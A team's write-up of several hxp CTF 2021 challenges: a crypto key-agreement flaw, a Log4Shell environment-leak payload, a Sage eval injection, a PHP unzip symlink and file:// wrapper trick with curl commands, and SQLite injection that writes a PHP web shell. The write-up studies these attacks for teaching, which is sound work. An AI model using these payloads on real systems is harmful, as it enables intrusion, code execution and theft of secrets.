# hxp CTF 2021
* Team
  * SOLQ
* Member
  * R09921A10
## Unsolved
### CRY
#### gipfel
* Description
  > Difficulty: easy  
  >  
  > Hey, I heard you’re good with computers! So… Thing is, I forgot my password. Can you help??
  * ```nc 65.108.176.66 1088```
  * [vuln.py](./CRY/gipfel/vuln.py)
* Solution
  * source code review
    ```python
    q = 0x3a05ce0b044dade60c9a52fb6a3035fc9117b307ca21ae1b6577fef7acd651c1f1c9c06a644fd82955694af6cd4e88f540010f2e8fdf037c769135dbe29bf16a154b62e614bb441f318a82ccd1e493ffa565e5ffd5a708251a50d145f3159a5
    password = random.randrange(10**6)

    def F(h, x):
    return pow(h, x, q)

    def go():
        g = int(H(password).hex(), 16)

        privA = 40*random.randrange(2**999)
        pubA = F(g, privA)
        print(f'{pubA = :#x}')

        pubB = int(input(),0)
        if not 1 < pubB < q:
            exit('nope')

        shared = F(pubB, privA)

        verA = F(g, shared**3)
        print(f'{verA = :#x}')

        verB = int(input(),0)
        if verB == F(g, shared**5):
            key = H(password, shared)
            flag = open('flag.txt').read().strip()
            aes = AES.new(key, AES.MODE_CTR, nonce=b'')
            print(f'flag:', aes.encrypt(flag.encode()).hex())
        else:
            print(f'nope! {shared:#x}')****
    ```
    * password is a random number with length 10**6
    * g is password
    * privA is a random number, denoted as a
    * pubA = g**a % q, denoted as A
      * this is known
    * pubB = user input, denoted as B
      * this is known
      * 1 < pubB < q
    * shared = B**a % q
    * verA = g**(shared ** 3) % q, denoted as vA
      * this is known
    * verB = g**(shared ** 5) % q, denoted as vB
      * verB is user input and should make the equation evaluated as true
  * calculating verB is easy if shared == 1 or shared == 0
    * B is controllable
    * the only thing we know about a is a multiple of 40, so it's even
    * since B is smaller than q and q is a prime, it's not possible to find other value B such that shared == 0, so we are going to make shared == 1
    * B % q can be either +1 or -1 since a is even
    * +1 is not possible so we choose -1, i.e., B == q-1 == -1 (mod q)
    * now shared == 1 and vA == g (mod q)
    * calculate vB is easy and also equals to g (mod q) which is exactly the value of vA when shared == 1
  * After getting the value of g and the encrypted flag, we can start bruteforcing on password to decrypt the flag since it's relatively small with range only 10**6
    * shared == 1
    * encrypted flag == 0x8cc14560e62654903a42eb6b9d95d24ea7bb2a63a394cabfedbd61e2450b9555164fcf30c1f0f8ba
* Flag
  * ```hxp{ju5T_k1ddIn9_w3_aLl_kn0w_iT's_12345}```
* Reference
  * [Buckeye Bureau of BOF](https://github.com/cscosu/ctf-writeups/tree/master/2021/hxp_ctf/gipfel)

### MSC
#### Log 4 Sanity Check
* Description
  > Difficulty estimate: easy
  > 
  > [ALARM ALARM](https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2021/2021-549032-10F2.pdf?__blob=publicationFile&v=6)
  * ```nc 65.108.176.77 1337```
  * [Log 4 sanity check-9afb8a24feb86db1.tar.xz](https://2021.ctf.link/assets/files/Log%204%20sanity%20check-9afb8a24feb86db1.tar.xz)
* Solution
  * According to the challenge's name and its link, it might be related to CVE-2021-44228
    * The version of log4j is 2.14.1 which is vulnerable to this exploit
  * Here's the brief discription of [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)
    * JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints
    * An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled
  * Decompile the [Vuln.class](MSC/Log%204%20sanity%20check/Vuln.class) with [Bytecode Viewer](https://github.com/Konloch/bytecode-viewer)
    ```java
    import java.util.Scanner;
    import org.apache.logging.log4j.LogManager;
    import org.apache.logging.log4j.Logger;

    public class Vuln {
        public static void main(String[] var0) {
            try {
                Logger var1 = LogManager.getLogger(Vuln.class);
                System.out.println("What is your favourite CTF?");
                String var2 = (new Scanner(System.in)).next();
                if (var2.toLowerCase().contains("dragon")) {
                    System.out.println("<3");
                    System.exit(0);
                }

                if (var2.toLowerCase().contains("hxp")) {
                    System.out.println(":)");
                } else {
                    System.out.println(":(");
                    var1.error("Wrong answer: {}", var2);
                }
            } catch (Exception var3) {
                System.err.println(var3);
            }

        }
    }
    ```
    * Verify that it's actually using log4j
  * Now we need to find out where is the flag, by analyzing the [Dockerfile](MSC/Log%204%20sanity%20check/Dockerfile), we can find out that the last command will set an environment variable ```FLAG``` with the value of flag
    * ```CMD ynetd -np y -lm -1 -lpid 64 -lt 10 -t 30 "FLAG='$(cat /flag.txt)' /home/ctf/run.sh"```
  * After some more [searching](https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/), it comes out that by using ```${env:FLAG}``` is enough for leaking environment variable's value
  * Last step is to combined it into payload that will trigger log4j to ```lookup``` , with error messages including the environment variable's value
    * ```${jndi:ldap:${env:FLAG}}```
* Flag
  * ```hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}```
#### brie man
* Description
  > Difficulty estimate: easy
  > 
  > Do you ever dream of solving a famous open question?  
  > (Now that we have your attention: Sorry, this challenge has nothing to do with Brie. 🧀)
  * [brie man-b6db7372d539e8b7.tar.xz](https://2021.ctf.link/assets/files/brie%20man-b6db7372d539e8b7.tar.xz)
  * ```nc 65.108.178.230 7904```
* Solution
  * The source code is short
    ```python
    #!/usr/bin/env sage
    import re

    if sys.version_info.major < 3:
        print('nope nope nope nope | https://hxp.io/blog/72')
        exit(-2)

    rx = re.compile(r'Dear Bernhard: Your conjecture is false, for ([^ ]{,40}) is a counterexample\.')

    s = CC.to_prec(160)(rx.match(input()).groups()[0])

    r = round(s.real())
    assert not all((s==r, r<0, r%2==0))     # boring

    assert not s.real() == 1/2              # boring

    assert zeta(s) == 0                     # uhm ok
    print(open('flag.txt').read().strip())
    ```
    * ```https://hxp.io/blog/72``` is a hint for us, the link says that in python2 the input() function will reads some input and then ```eval()``` it
    * However, in this case only python3 is allowed
    * It still might be useful if other functions have similar behavior, we can start from the ```CC.to_prec``` function since it'll take our input as parameter
  * Fuzzing with this function get some interesting error response and result
    ```python
    #Input
    CC.to_prec(160)('print(123)')
    #Output
    flag
    NaN + NaN*I

    #Input
    CC.to_prec(160)('print(flag.txt)')
    #Error message
    /home/sage/sage/local/lib/python3.7/site-packages/sage/misc/sage_eval.py in sage_eval(source, locals, cmds, preparse)
        201         return locals['_sage_eval_returnval_']
        202     else:
    --> 203         return eval(source, sage.all.__dict__, locals)
        204 
        205 

    /home/sage/sage/local/lib/python3.7/site-packages/sage/all.py in <module>()

    NameError: name 'flag' is not defined
    ```
    * The result indicates that this function also used ```eval``` and it can execute python function
  * payload
    * ```Dear Bernhard: Your conjecture is false, for print(open('flag.txt').read()) is a counterexample.```
* Flag
  * ```hxp{0NE_M1LL10N_D0LLAR5}```
* Reference
  * [Buckeye Bureau of BOF](https://github.com/cscosu/ctf-writeups/tree/master/2021/hxp_ctf/brie-man)

### WEB
#### unzipper
* Description
  > Difficulty estimate: medium
  > 
  > Here, let me unzip that for you.
  * [unzipper-344248a9240214c2.tar.xz](https://2021.ctf.link/assets/files/unzipper-344248a9240214c2.tar.xz)
  * ```http://65.108.176.76:8200/```
* Solution
  * Take a look at the source code
    ```php
    <?php
    session_start() or die('session_start');

    $_SESSION['sandbox'] ??= bin2hex(random_bytes(16));
    $sandbox = 'data/' . $_SESSION['sandbox'];
    $lock = fopen($sandbox . '.lock', 'w') or die('fopen');
    flock($lock, LOCK_EX | LOCK_NB) or die('flock');

    @mkdir($sandbox, 0700);
    chdir($sandbox) or die('chdir');

    if (isset($_FILES['file']))
        system('ulimit -v 8192 && /usr/bin/timeout -s KILL 2 /usr/bin/unzip -nqqd . ' . escapeshellarg($_FILES['file']['tmp_name']));
    else if (isset($_GET['file']))
        if (0 === preg_match('/(^$|flag)/i', realpath($_GET['file']) ?: ''))
            readfile($_GET['file']);

    fclose($lock);
    ```
    * It'll dynamically generate directory with random path to each new session
    * If a file is uploaded, it'll be unzipped and stored in that directory
    * If a ```file``` GET parameter is set
      * it'll first check if string ```flag``` is included in the path with ```realpath```
      * If not included it'll use ```readfile``` to read the specified file
  * The [Dockerfile](WEB/unzipper/Dockerfile) indicates that the flag is stored in ```/flag.txt```
    * Since ```flag``` is forbidden, it's not possible to get it directly with the arbitrary file read vulnerability
  * How ```realpath``` and ```readfile``` deals with its parameter is different
    * [```realpath```](https://www.php.net/manual/en/function.realpath.php)
      * realpath() expands all symbolic links and resolves references to /./, /../ and extra / characters in the input path and returns the canonicalized absolute pathname
    * [```readfile```](https://www.php.net/manual/en/function.readfile.php)
      * Reads a file and writes it to the output buffer
      * A URL can be used as a filename with this function if the fopen wrappers have been enabled. See fopen() for more details on how to specify the filename.
      * [```fopen```](https://www.php.net/manual/en/function.fopen.php)
        * If filename is of the form "scheme://...", it is assumed to be a URL and PHP will search for a protocol handler (also known as a wrapper) for that scheme
    * To sum up, ```realpath``` will convert the path into UNIX format path string, while readfile can receive protocol as parameter and won't consider it as part of path
      * ```file:///flag.txt```
        * flag.txt is a simlink to fake.txt, i.e., flag.txt -> fake.txt
      * readfile -> ```/flag.txt```
      * realpath -> ```file:/fake.txt```
        * ```file:``` is a directory
  * The request is clear, we need to create a file named ```flag.txt``` which is a simlink to an arbitrary file whose name doesn't include ```flag```. Moreover, these two file should be stored in a directory named ```file:``` to invoke php file protocol when calling ```readfile```
    * payload
      ```sh
      #!/bin/sh
      rm -rf file:
      mkdir file:
      cd file:
      touch fake.txt
      ln -s fake.txt flag.txt
      cd ..
      zip -ry exploit.zip file:

      curl -H 'Cookie: PHPSESSID=01t6q8mr3rsr06deavbifeik2q' http://65.108.176.76:8200 -F "file=@exploit.zip"
      curl -s -H 'Cookie: PHPSESSID=01t6q8mr3rsr06deavbifeik2q' http://65.108.176.76:8200/?file=file:///flag.txt > flag.txt
      ```
* Flag
  * ```hxp{at_least_we_have_all_the_performance_in_the_world..._lolphp_:/}```
* Reference
  * [mikecat](https://mikecat.github.io/ctf-writeups/2021/20211218_hxp_CTF_2021/WEB/unzipper/#en)
#### shitty blog 🤎
* Description
  > Difficulty estimate: easy
  > 
  > Please use my shitty blog 🤎!
  * [shitty blog 🤎-a6c0b8b672817005.tar.xz](https://2021.ctf.link/assets/files/shitty%20blog%20%F0%9F%A4%8E-a6c0b8b672817005.tar.xz)
  * ```http://65.108.176.96:8888/```
* Solution
  * Take a look at the  [source code](WEB/shitty%20blog%20🤎/index.php)
    ```php
    $secret = 'SECRET_PLACEHOLDER';
    $salt = '$6$'.substr(hash_hmac('md5', $_SERVER['REMOTE_ADDR'], $secret), 16).'$';

    if(! isset($_COOKIE['session'])){
        $id = random_int(1, PHP_INT_MAX);
        $mac = substr(crypt(hash_hmac('md5', $id, $secret, true), $salt), 20);
    }
    else {
        $session = explode('|', $_COOKIE['session']);
        if( ! hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])) {
            exit();
        }
        $id = $session[0];
        $mac = $session[1];
    }
    
    ...
    ...

    function get_user($db, $user_id) : string {
        foreach($db->query("SELECT name FROM user WHERE id = {$user_id}") as $user) {
            return $user['name'];
        }
        return 'me';
    }

    ...
    ...

    function delete_entry($db, $entry_id, $user_id) {
        $db->exec("DELETE from entry WHERE {$user_id} <> 0 AND id = {$entry_id}");
    }
    ```
    * It'll create a sqlite database for each session
    * The ```get_user``` and ```delete_entry``` functions are vulnerable to sql injection
      * ```$entry_id``` is not controllable while ```$user_id``` is controllable but with some limitations
  * ```$user_id``` is the first part of the session splitted by ```|```, and the second part is its ```mac```
    * ```hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])```
    * These must evaluates to true, otherwise the connection will be terminated
    * The vulnerability lies in the function [```crypt```](https://www.php.net/manual/en/function.crypt.php) because this function is not (yet) binary safe!. And also the fourth parameter of ```hash_hmac``` indicates this is generated as a binary
      * In detail, The flaw is due to an error in ```crypt``` function which returns the salt value instead of hash value when executed with MD5 hash
      * This happens when md5 is used and that the md5 value starts with null byte ('\x00') because ```crypt``` takes a null-terminated character array and anything after the null byte is ignored
    * Brute force to request for the ```mac``` untill the ```mac``` was seen before
      * the probability is 1/256 (0x00 ~ 0xFF)
  * The next step is trying to execute ```readflag``` which is an executable binary in the website
    * To do so, we need to exploit SQL injection into RCE
    * After some [searching](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database), one way to acheive RCE is to create a new database under ```/var/www``` named ```[ARBITRARY].php```, then insert the php code
    * payload
      ```sql
      ATTACH DATABASE '/var/www/lol.php' AS lol;
      CREATE TABLE lol.pwn (dataz text);
      INSERT INTO lol.pwn (dataz) VALUES ('<?php system(\"/readflag\"); ?>');--
      ```
  * Combine everything together
    * Forge the mac
    * Attempt to do SQL injection until the mac of payload equals to the forged mac
      * Since payload needs to be variable otherwise the mac will always be the same, we need to add some junk code after the comment ```--``` to change the payload's mac
    * After successfully injection, we also get the right cookie
    * Use this cookie to post an arbitrary post and delete it, and then the ```delete_entry``` will be triggered. Thus the injection code will be invoked
    * Visit ```/var/www/lol.php``` to execute the payload and get the flag
* Flag
  * ```hxp{dynamically_typed_statically_typed_php_c_I_hate_you_all_equally__at_least_its_not_node_lol_:(}```
* Reference
  * [KITCTF](https://wachter-space.de/2021/12/19/hxp_21)
  * [Buckeye Bureau of BOF](https://github.com/cscosu/ctf-writeups/tree/master/2021/hxp_ctf/shitty-blog)